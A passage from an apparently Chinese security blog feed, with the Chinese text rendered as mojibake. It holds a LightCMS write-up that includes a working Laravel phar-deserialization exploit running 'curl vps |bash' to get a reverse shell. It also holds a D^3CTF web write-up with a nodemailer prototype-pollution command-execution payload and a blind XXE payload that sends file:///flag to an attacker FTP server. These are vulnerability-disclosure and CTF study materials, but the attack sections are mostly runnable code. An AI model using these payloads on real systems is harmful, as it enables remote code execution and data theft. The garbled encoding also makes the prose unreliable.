<code>file_get_contents</code>æ¥è·å–æ–‡ä»¶å†…å®¹ï¼Œå¹¶ä¿å­˜ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨fileåè®®å®ç°ä»»æ„æ–‡ä»¶è¯»å–ç­‰ssrfæ“ä½œã€‚æ›´å±é™©çš„æ˜¯è¿™é‡Œçš„é€»è¾‘æ˜¯å–åˆ°çš„æ–‡ä»¶ååç¼€æ˜¯ä»€ä¹ˆï¼Œä¿å­˜çš„å°±æ˜¯ä»€ä¹ˆåç¼€ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ”¾ä¸€ä¸ªphpä¸€å¥è¯åœ¨æœåŠ¡å™¨ä¸Šï¼Œç„¶åæ¥è¯·æ±‚ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥getshellã€‚</p><p>å…·ä½“å¯è§<a href="https://github.com/eddy8/LightCMS/issues/19">https://github.com/eddy8/LightCMS/issues/19</a>ã€‚</p><h2 id="v1-3-7-RCEæ¼æ´"><a href="#v1-3-7-RCEæ¼æ´" class="headerlink" title="v1.3.7 RCEæ¼æ´"></a>v1.3.7 RCEæ¼æ´</h2><p>æäº†ä¸ªissueåï¼Œä½œè€…ä¹Ÿæ˜¯åŠæ—¶è¿›è¡Œäº†ä¿®å¤ï¼Œåˆ†æä¸‹patchçš„æ“ä½œï¼Œå¢åŠ äº†ä¸€ä¸ª fetchImageFile å‡½æ•°å¤„ç†ï¼š</p><p><img src="/2021/05/10/lightcms-RCE/image-20210510002401236.png" alt="image-20210510002401236"></p><p>è·Ÿè¿›åˆ†æ fetchImageFileï¼š</p><p><img src="/2021/05/10/lightcms-RCE/image-20210510002453997.png" alt="image-20210510002453997"></p><p>å¯ä»¥çœ‹åˆ°ä½¿ç”¨äº†curlæ¥è·å–è¿œç¨‹èµ„æºçš„å†…å®¹ï¼Œç„¶åä½¿ç”¨ Image:make æ¨¡å—è¿›è¡Œè§£æã€‚å¹¶ä¸”å¯¹åç¼€ä¹Ÿè¿›è¡Œäº†ä¸¥æ ¼çš„è¿‡æ»¤ã€‚åŒæ—¶è¿™ä¸ª cms å¤§å¤šéƒ½æ˜¯æ•°æ®åº“æ“ä½œï¼Œæ¶‰åŠæ–‡ä»¶æ“ä½œå°‘ä¹‹åˆå°‘ï¼Œçœ‹èµ·æ¥æ˜¯æ— æ³•ç›´æ¥RCEçš„ã€‚</p><p>laravel æ¡†æ¶å¼€å‘æˆ‘è‡ªç„¶è”æƒ³åˆ°äº†ååºåˆ—åŒ–ï¼Œå¹¶ä¸”è¿™ä¸ªcms åå°è¿˜æ˜¯æœ‰å›¾ç‰‡ä¸Šä¼ åŠŸèƒ½çš„ï¼Œèƒ½ä¸èƒ½åˆ©ç”¨ phar ååºåˆ—åŒ–å®ç° RCE å‘¢ï¼Ÿ</p><h3 id="POPé“¾"><a href="#POPé“¾" class="headerlink" title="POPé“¾"></a>POPé“¾</h3><p>æ­£å¼ç‰ˆæœ¬Laravel ç‰ˆæœ¬æ˜¯ 6.20.16ï¼Œæµ‹è¯•å‘ç° 5.8 ç‰ˆæœ¬åˆ©ç”¨ <code>dispatch</code>æ–¹æ³•çš„RCEé“¾åœ¨6.20.16ç‰ˆæœ¬å¯ä»¥ä½¿ç”¨ã€‚ç»è¿‡æµ‹è¯• 7.x ç‰ˆæœ¬ä¹Ÿå¯ä»¥ä½¿ç”¨è¿™æ¡é“¾ã€‚<a href="https://www.anquanke.com/post/id/231079">è¿™ç¯‡æ–‡ç« </a>åˆ†æåˆ°äº†laravel 8 çš„é“¾å­ï¼Œä¸è¿‡å¤šèµ˜è¿°äº†ã€‚</p><h3 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h3><p>æœ‰äº† RCE é“¾ï¼Œæˆ‘ä»¬éœ€è¦å°† phar æ–‡ä»¶ä¼ ä¸Šå»ã€‚patch è¿‡çš„è¿œç¨‹ä¸‹è½½å›¾ç‰‡åŠŸèƒ½ï¼Œä½¿ç”¨äº†<code>Intervention\Image\Facades\Image</code>åº“æ¥è¿›è¡Œå›¾ç‰‡è§£æï¼Œå¯¹æ–‡ä»¶å†…å®¹æ£€æŸ¥è¾ƒä¸ºä¸¥æ ¼ï¼Œä½†æ˜¯æœ¬åœ°å›¾ç‰‡ä¸Šä¼ å¤„è¾ƒä¸ºæ¾æ•£ï¼Œä½¿ç”¨ä¸€èˆ¬çš„æ·»åŠ  GIF æ–‡ä»¶å¤´çš„æ–¹æ³•å°±å¯ä»¥æˆåŠŸä¸Šä¼ ã€‚</p><h3 id="è§¦å‘ç‚¹"><a href="#è§¦å‘ç‚¹" class="headerlink" title="è§¦å‘ç‚¹"></a>è§¦å‘ç‚¹</h3><p>æœ€åä¸€æ­¥ä¹Ÿå°±æ˜¯ç›¸å¯¹å›°éš¾çš„ä¸€æ­¥ï¼Œéœ€è¦æ‰¾åˆ°è§¦å‘pharçš„ç‚¹ï¼Œå³æˆ‘ä»¬å¯æ§çš„ä¸€ä¸ªæ–‡ä»¶å¤„ç†å‡½æ•°ã€‚å…¶å®å‰é¢æåˆ°äº†è¿™ä¸ªcmså¹¶æ²¡æœ‰å¤ªå¤šæ–‡ä»¶æ“ä½œã€‚</p><p>æ³¨æ„åˆ°ä¿®å¤ä»£ç  <code>fetchImageFile</code>å‡½æ•°å­˜åœ¨å¦‚ä¸‹æ“ä½œï¼š</p><p><img src="/2021/05/10/lightcms-RCE/image-20210510003422513.png" alt="image-20210510003422513"></p><p>åœ¨è·å–åˆ°è¿œç¨‹urlçš„å†…å®¹åï¼Œä¼šè°ƒç”¨ <code>Intervention\Image\Facades\Image</code>çš„ <code>make</code>æ–¹æ³•ï¼Œå¯¹å›¾ç‰‡å†…å®¹è¿›è¡Œè§£æã€‚</p><p>çœ‹åˆ°è¿™é‡Œæˆ‘éšçº¦æƒ³èµ·ä¹‹å‰è§è¿‡ <code>Image:make($url)</code>è¿™ç§ç”¨æ³•ï¼Œé‚£ä¹ˆè¿™é‡Œçš„ url èƒ½ä¸èƒ½æœ‰ç±»ä¼¼ file_get_content ä¹‹ç±»çš„æ–‡ä»¶æ“ä½œå‘¢ï¼Ÿ</p><p>è·Ÿè¿›ï¼Œä¼šè·³åˆ° <code>vendor/intervention/image/src/Intervention/Image/AbstractDecoder.php</code>ä¸­ <code>AbstractDecoder</code>ç±»çš„ <code>init</code>æ–¹æ³•ï¼Œåˆ¤æ–­æ•°æ®ç±»å‹ï¼š</p><p><img src="/2021/05/10/lightcms-RCE/image-20210510003643456.png" alt="image-20210510003643456"></p><p>å¯ä»¥çœ‹åˆ° data ä¸ä»…å¯ä»¥æ˜¯å›¾ç‰‡çš„äºŒè¿›åˆ¶æ•°æ® ï¼Œè¿˜å¯ä»¥æ˜¯è¿™äº›æ•°æ®æ ¼å¼ï¼Œè·Ÿè¿› <code>initFromUrl</code>æ–¹æ³•ï¼š</p><p><img src="/2021/05/10/lightcms-RCE/image-20210510003659411.png" alt="image-20210510003659411"></p><p>éå¸¸æ˜æ˜¾çš„ file_get_contentsï¼Œé‚£ä¹ˆæœ€åè§¦å‘ç‚¹çš„é—®é¢˜ä¹Ÿè§£å†³äº†ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ vps ä¸Šæ”¾ç½®ä¸€ä¸ª txt æ–‡ä»¶ï¼Œå†…å®¹ä¸º <code>phar://./upload/xxx</code>ï¼Œç„¶åè®©æœåŠ¡å™¨æ¥å–è¿™ä¸ªæ–‡ä»¶ï¼Œå³å¯è§¦å‘ååºåˆ—åŒ–ã€‚</p><h3 id="RCEæµç¨‹"><a href="#RCEæµç¨‹" class="headerlink" title="RCEæµç¨‹"></a>RCEæµç¨‹</h3><p>é¦–å…ˆç”Ÿæˆ phar æ–‡ä»¶:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingBroadcast</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> $event;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$events, $event</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = $events;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event = $event;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BroadcastEvent</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">      <span class="keyword">protected</span> $connection;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$connection</span>)</span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;connection = $connection;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Bus</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Dispatcher</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">queueResolver</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$queueResolver</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">          <span class="keyword">$this</span>-&gt;queueResolver = $queueResolver;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $command = new Illuminate\Broadcasting\BroadcastEvent(&#x27;curl vps |bash&#x27;);</span><br><span class="line"></span><br><span class="line">    $dispater = <span class="keyword">new</span> Illuminate\Bus\Dispatcher(<span class="string">&quot;system&quot;</span>);</span><br><span class="line"></span><br><span class="line">    $PendingBroadcast = <span class="keyword">new</span> Illuminate\Broadcasting\PendingBroadcast($dispater,$command);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line">    $phar -&gt; stopBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); </span><br><span class="line">    $phar -&gt; addFromString(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">    $phar -&gt; setMetadata($PendingBroadcast);</span><br><span class="line">    $phar -&gt; stopBuffering();</span><br><span class="line">    rename(<span class="string">&#x27;phar.phar&#x27;</span>,<span class="string">&#x27;phar.jpg&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨åå°æ·»åŠ æ–‡ç« å¤„ä¸Šä¼ å›¾ç‰‡ï¼š</p><p><img src="/2021/05/10/lightcms-RCE/image-20210510003829527.png" alt="image-20210510003829527"></p><p>å¾—åˆ°æ–‡ä»¶è·¯å¾„ <code>upload/image/202102/AciwTtmKQ7IQN4gdeoiZ6ve4A0LSK48SGJGk38df.gif</code>ã€‚</p><p>åœ¨ vps ä¸Šæ”¾ç½®ä¸€ä¸ªæ–‡ä»¶ï¼Œå†…å®¹ä¸º <code>phar://./upload/image/202102/AciwTtmKQ7IQN4gdeoiZ6ve4A0LSK48SGJGk38df.gif</code>ï¼Œè®©æœåŠ¡å™¨æ¥å–è¿™ä¸ªæ–‡ä»¶ï¼š</p><p><img src="/2021/05/10/lightcms-RCE/image-20210510003921345.png" alt="image-20210510003921345"></p><p>å¯ä»¥åå¼¹shellï¼š</p><p><img src="/2021/05/10/lightcms-RCE/image-20210510003934994.png" alt="image-20210510003934994"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™ä¸ªæ¼æ´è™½ç„¶åˆ©ç”¨èµ·æ¥å¹¶ä¸ç®—å¤æ‚ï¼Œä½†æ˜¯ phar è§¦å‘ç‚¹ç›¸å¯¹éšç§˜ä¸€äº›ï¼Œä¸å®¹æ˜“è¢«å‘ç°ï¼Œè¿™ä¸ªæ“ä½œä¹Ÿæ˜¯ä¹‹å‰æ²¡æœ‰è§è¿‡çš„ï¼ˆæ„Ÿè§‰å¾ˆé€‚åˆCTF 2333ï¼‰ï¼Œè¿˜æ˜¯æŒºæœ‰è¶£çš„ï¼Œåªå¯æƒœæ„Ÿè§‰æ‰“çš„äººä¸å¤ªå¤šã€‚</p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
          <category> Web </category>
          
          <category> ååºåˆ—åŒ– </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> laravel </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021 D^3CTF Web éƒ¨åˆ†wp</title>
      <link href="/2021/03/08/2021-D3CTF/"/>
      <url>/2021/03/08/2021-D3CTF/</url>
      
        <content type="html"><![CDATA[<p>å‘¨æœ«ä¸¤å¤©å‡ ä¹éƒ½åœ¨è‚D^3CTFï¼Œæœ¬æ¥é˜Ÿé‡Œæ‰“çš„äººå°±ä¸å¤šï¼Œé¢˜è´¨é‡è¿˜å¾ˆé«˜è€Œä¸”é¢˜é‡ä¹Ÿä¸å°‘ï¼Œæ‰€ä»¥æ‰“çš„éå¸¸ç´¯ã€‚ Web åŸºæœ¬ä¸€äººå•æï¼Œåæ¥æŠŠé˜Ÿé‡Œé€†å‘ï¼ˆå…¨æ ˆï¼‰å¤§ä½¬æ‹‰æ¥ä¸€èµ·æ shellgenï¼Œæµªè´¹äº†ä¸å°‘æ—¶é—´ã€‚</p><p>æœ€åæˆç»©æ˜¯ç¬¬å››åï¼ˆæœç„¶æ˜¯ Redbud-Misc é˜Ÿï¼ŒAK Miscï¼‰ï¼Œè„‘ç‹yydsï¼Œè¿™é‡Œè®°å½•ä¸‹ä¸‰é“Webçš„wpã€‚</p><a id="more"></a><img src="/2021/03/08/2021-D3CTF/image-20210308190727832.png" alt="image-20210308190727832" style="zoom:50%;"><h2 id="8-bit-pub"><a href="#8-bit-pub" class="headerlink" title="8-bit pub"></a>8-bit pub</h2><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>å…ˆè¦ç™»é™†adminã€‚</p><p>ä¼ å…¥çš„usernameå’Œpasswordå¦‚æœç”¨jsonæäº¤ï¼Œå¯ä»¥ä¼ å…¥dictã€‚å¦‚æœpasswordæ˜¯ä¸ªdictï¼Œä¼šæŠŠkeyåå­—ä½œä¸ºåˆ—æŸ¥è¯¢ï¼Œæ„é€ Payload: </p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="attr">&quot;password&quot;</span>:&#123;<span class="attr">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>å³å¯ç™»é™†adminã€‚</p><p>è¿›å…¥adminï¼Œå¯ä»¥å‘é‚®ä»¶çš„åŠŸèƒ½ï¼Œä½¿ç”¨äº† nodemailerã€‚å‰é¢ä½¿ç”¨äº†shvl æ¥è¿›è¡Œèµ‹å€¼ï¼ŒçŒœæµ‹æœ‰åŸå‹é“¾æ±¡æŸ“ã€‚æŸ¥çœ‹ç‰ˆæœ¬ï¼Œå‘ç° shvl æ˜¯ 2.0.2 çš„ç‰ˆæœ¬ï¼ŒåŸå‹é“¾æ±¡æŸ“è¢«ä¿®å¤ï¼š</p><p><img src="/2021/03/08/2021-D3CTF/JNoBlTqeMr3JZA1oWU54M_ZWo7CrJ01GspHHPdgkoBit9Jd1RIl30S0BhFNLpxYKa0hWyhFGkCaQZfFqyqUrYTXuNbaRUZaiyD5SviOf6b1C4oXQBB6V7Gev5wXD7Yb7rY0L4jqO.png" alt="img"></p><p>ä½†æ˜¯ä»…ä»…è¿‡æ»¤äº†å…³é”®å­—__proto__ï¼Œå¯ä»¥ä½¿ç”¨ prototype ç»•è¿‡ã€‚</p><p>åŸå§‹çš„åˆ©ç”¨ï¼š</p><img src="/2021/03/08/2021-D3CTF/mPACSo-7KERY1x58_2hFnEDuja_G_jbRZgeGU7p5yQilELEqAMww0lggbZimkRLhhmUH4g-bsrMWeH0lmqWd1SsWdH12nk5EsZhNWf6_iTNpNV8EXBROgKtzAtSpLKJx-xDqbfmI.png" alt="img" style="zoom:50%;"><p>å¯ä»¥ä½¿ç”¨prototypeç»•è¿‡ï¼Œpayloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a.constructor.prototype.path</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥éœ€è¦åœ¨ nodemailer é‡Œæ‰¾rceçš„ç‚¹ï¼Œæœå…³é”®å­—å‘ç°äº†å­˜åœ¨ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œçš„ç‚¹ï¼š</p><img src="/2021/03/08/2021-D3CTF/w32rGyw-n0Nmg7NWPZ9rc4HHJvqoGbbhZ3Bx8maQxKm8slrulLKGXD-9DWHISq8CINqN58Gv_aURe84W5m6nZdOyYCP0ETMWAYIpwP5P0mcqAjLZTSb_lYkx5RJKjhx11R5_5WSB.png" alt="img" style="zoom:50%;"><p>å­˜åœ¨è°ƒç”¨ï¼š</p><img src="/2021/03/08/2021-D3CTF/6wUGhVotlC5QKgc-kbVWXiSXBRYgXNGAC7GqDhP2MC45tiYKA3A6r7c7cahi_uXmV5sLRc9MKyPZrjeCjeSfe4sZ_gOFyJ5IPIZoakVWrOHMh0hnmWupUtJZcdrimsHvpQYmrVG2.png" alt="img" style="zoom:50%;"><p>åŸæœ¬æ˜¯æ‰§è¡Œsendmailçš„ï¼Œå¯ä»¥è€ƒè™‘æ±¡æŸ“ this.pathï¼Œå°±å¯ä»¥rceäº†ã€‚è¿½è¸ªæºç ï¼Œå¯»æ‰¾ this.path çš„èµ‹å€¼ï¼š</p><p><img src="/2021/03/08/2021-D3CTF/EKV5IETE1fYX1XFBlQyoNuFoT3H-Ull4syXvhRw60lxJI2LtlLwq8jjBOcjhx6Lpg_nwsrAJZtS_w-iZZkY4cY7yuSK8w9tubMJYUuy_RJbzCXPEHoiihk9r7JyroiWBDe-d_HQ0.png" alt="img"></p><p>Options.path èµ‹å€¼ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥å‘ Object é‡Œæ±¡æŸ“ä¸€ä¸ªpathï¼Œå°±å¯ä»¥äº†ã€‚</p><p>ä½†æ˜¯è¦ä½¿ç”¨ sendmailï¼Œåœ¨nodemailer/lib/nodemailer.jsè¿˜æœ‰ä¸€å¤„ifåˆ¤æ–­ï¼š</p><img src="/2021/03/08/2021-D3CTF/wEH2DVHzBS7_dLhM5JeJokDRaQ07wmttykDGHYDTjfxTd8uTrIXGmNIQgTrxJ_hsYMGUoZrHoFfhTtkJ7zhnPOClPyUWM4Z6djK52EgDqbqKg2VEY9WzFg5GPb8P4dw-tVy5yUxe.png" alt="img" style="zoom:50%;"><p>æ‰€ä»¥è¿˜è¦æ±¡æŸ“ä¸€ä¸ªpoolä¸º0ï¼Œæ±¡æŸ“ä¸€ä¸ªsendmailä¸º1ã€‚</p><p>æœ€å spawn æ‰§è¡Œå‘½ä»¤ï¼Œä¸æ”¯æŒç®¡é“ç¬¦ä¹‹ç±»çš„ï¼Œæ‰€ä»¥ /readflag &gt; /tmp/gml è¿™ç§æ— æ³•ç›´æ¥æ‰§è¡Œã€‚</p><p>æ³¨æ„åˆ°æœ‰argsï¼Œå¯ä»¥ä¸ºå‘½ä»¤é™„å¸¦å‚æ•°ã€‚çœ‹çœ‹è¿™ä¸ªargsæ€ä¹ˆèµ‹å€¼çš„ï¼š</p><img src="/2021/03/08/2021-D3CTF/p-xOu8p_m0U7fj2F8F0ccBoj5nL2ZsD71bKQzWY2zYANynVRwP5Noie7m8PS8lQW5cZVLfeGkuHkaZc8OnIpoKro1em10kdzcH49H4Xx8gQOqvghyLcjmlma-emOhnYnq2eugIJF.png" alt="img" style="zoom: 50%;"><p>ä¹Ÿå¯ä»¥è¿›è¡Œæ±¡æŸ“ï¼Œä½†æ˜¯åœ¨æ‰§è¡Œå‰ï¼ŒåŠ äº†ä¸ª -i å‚æ•°ï¼š</p><p><img src="/2021/03/08/2021-D3CTF/zP-1m-vQp7DdOdNOK8HytgVbaB7efTFC8k8ITjZ7Y-xdnMwCBeB2mqmhVX_Mgm19PPSYUIbsULS239jCt25DSlBG5LoKwMaD4x061o6imHCKNT_fBCFxSWadKtAeQ6lLB4Aw-EJa.png" alt="img"></p><p>å°è¯• curl -iï¼Œwget -i ä¹‹ç±»çš„ï¼Œä½†æ˜¯æ— æ³•æŠŠå‘½ä»¤æ‰§è¡Œçš„ç»“æœå¸¦å‡ºã€‚</p><p>æœ€åæµ‹è¯•å¯ä»¥ bash -i -c è¿™æ ·ï¼š</p><p><code>spawn(&#39;bash&#39;,[&#39;-i&#39;,&#39;-c&#39;,&#39;ls &gt; /tmp/gml&#39;]);</code></p><p>æœ¬åœ°æµ‹è¯•æˆåŠŸæ‰§è¡Œã€‚ç„¶åå‘é‚®ä»¶åŠŸèƒ½æˆ‘ä»¬å¯ä»¥æŒ‡å®šé™„ä»¶ï¼ŒæŠŠ /tmp/gml é€šè¿‡é‚®ä»¶ç»™å‘è¿‡æ¥ã€‚</p><h3 id="æ”»å‡»"><a href="#æ”»å‡»" class="headerlink" title="æ”»å‡»"></a>æ”»å‡»</h3><p>é¦–å…ˆåŸå‹é“¾æ±¡æŸ“ï¼Œæ‰§è¡Œå‘½ä»¤ï¼Œpayloadï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;subject&quot;</span>:<span class="string">&quot;123&quot;</span>,<span class="attr">&quot;text&quot;</span>:<span class="string">&quot;123&quot;</span>,<span class="attr">&quot;a.constructor.prototype.path&quot;</span>:<span class="string">&quot;sh&quot;</span>,<span class="attr">&quot;a.constructor.prototype.pool&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;a.constructor.prototype.sendmail&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;a.constructor.prototype.args&quot;</span>:[<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;/readflag&gt;/tmp/gml&quot;</span>]&#125;</span><br></pre></td></tr></table></figure><p>æŠŠflagå†™è¿›/tmp/flagã€‚å†é€šè¿‡å‘é‚®ä»¶é™„ä»¶çš„å½¢å¼ï¼ŒæŠŠflagç»™æˆ‘å‘è¿‡æ¥ã€‚ç¿»é˜…æ–‡æ¡£å‘é€é™„ä»¶çš„æ–¹æ³•ï¼Œpayloadï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;to&quot;</span>:<span class="string">&quot;xxx@qq.com&quot;</span>,<span class="attr">&quot;subject&quot;</span>:<span class="string">&quot;123&quot;</span>,<span class="attr">&quot;text&quot;</span>:<span class="string">&quot;123&quot;</span>,<span class="attr">&quot;attachments&quot;</span>:[&#123;<span class="attr">&quot;filename&quot;</span>:<span class="string">&quot;gml.txt&quot;</span>,<span class="attr">&quot;path&quot;</span>:<span class="string">&quot;/tmp/gml&quot;</span>&#125;]&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/03/08/2021-D3CTF/5aiWUmG8S1x0uEsU1N-VSaQOwiXtTwL6_lzQIc4YAJWEKH-55wo9pZECJfk4hkUkc5NvCWRofRTI3ck-sJX2vPSvjpuVFh-YzknIe8izOhaGqOJ0KHxNtkj1YMZkpV3cim5j170D.png" alt="img"></p><h2 id="Real-cloud-storage"><a href="#Real-cloud-storage" class="headerlink" title="Real_cloud_storage"></a>Real_cloud_storage</h2><p>ä¸Šä¼ æ–‡ä»¶ï¼Œå¾€fn10085032.serverless.cloud.d3ctf.ioå‘åŒ…ï¼Œå¯ä»¥æŒ‡å®šendpoint ä¸backetã€‚</p><p>æµ‹è¯•å‘ç°å¯ä»¥æŒ‡å®šæˆä»»æ„åŸŸã€‚è®¾ç½®æŒ‡å®šæˆè‡ªå·±çš„æœåŠ¡å™¨ï¼Œè§‚å¯Ÿå‘æ¥çš„ä¸Šä¼ åŒ…ï¼š</p><p><img src="/2021/03/08/2021-D3CTF/image-20210308173200850.png" alt="image-20210308173200850"></p><p>Google ä¸€ä¸‹ nos-sdk-javaï¼Œå‘ç°æºç ï¼š<a href="https://github.com/NetEase-Object-Storage/nos-java-sdk">https://github.com/NetEase-Object-Storage/nos-java-sdk</a></p><p>æºç å®¡è®¡ï¼Œå› ä¸ºæˆ‘ä»¬åªæœ‰ä¸€ä¸ªuploadåŠŸèƒ½ï¼Œåªæœ‰é‚£å‡ ä¸ªå‚æ•°ï¼Œæ‰€ä»¥å…³æ³¨uploadåŠŸèƒ½çš„ç›¸å…³æºç ï¼Œä½†æ²¡å•¥åˆ©ç”¨çš„ã€‚</p><p>å°è¯•æ¨¡ä»¿è¿™ä¸ªåŒ…ï¼Œæˆ‘ä»¬è‡ªå·±æ„é€ å‘ oss ä¸Šä¼ æ–‡ä»¶çš„åŒ…ï¼š</p><p><img src="/2021/03/08/2021-D3CTF/IRZvn_IUWBeTQas6Owk9_H8WjyWWDS_I20bWZnyn0lOGG5Br8qCwBWczaNuyTY9igJ5YTYcjWfFtg1iwej3uOtehAJJo17-Dyj4G6iZEF71eBDWlrq-GT62Emnyda78v5_5Jhl-r.png" alt="img"></p><p>è¿”å›é”™è¯¯ã€‚ä½†æ˜¯å¯ä»¥çœ‹åˆ°è¿”å›æ˜¯ xmlã€‚ä¸Šä¼ çš„ client æ˜¯ javaï¼ŒçŒœæµ‹è¿™ä¸ª client ä¼šåœ¨å‘ oss ä¸Šä¼ åè§£æè¿”å›çš„ xml ã€‚</p><p>ç¿»é˜…æºç ï¼Œæœç„¶æœ‰ç›¸å…³çš„æ“ä½œã€‚è€ƒè™‘ xxe æ”»å‡»ï¼Œæˆ‘ä»¬æ§åˆ¶è¿”å›çš„responseåŒ…å« xxe çš„payloadï¼Œä½¿ç”¨ç›²æ‰“xxeã€‚</p><p>ä½¿ç”¨ <a href="https://requestrepo.com/">https://requestrepo.com/</a>ï¼Œæ–¹ä¾¿æ§åˆ¶responseï¼Œresponseçš„ paylaodï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xmlrootname</span> [<span class="meta">&lt;!ENTITY % <span class="meta-keyword">aaa</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://vps/ext.dtd&quot;</span>&gt;</span>%aaa;%ccc;%ddd;]&gt;</span></span><br></pre></td></tr></table></figure><p>æœåŠ¡å™¨ä¸Šçš„ ext.dtdï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">bbb</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span><span class="meta">&lt;!ENTITY % <span class="meta-keyword">ccc</span> <span class="meta-string">&quot;&lt;!ENTITY &amp;#37; ddd SYSTEM &#x27;ftp://vps:2121/%bbb;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img 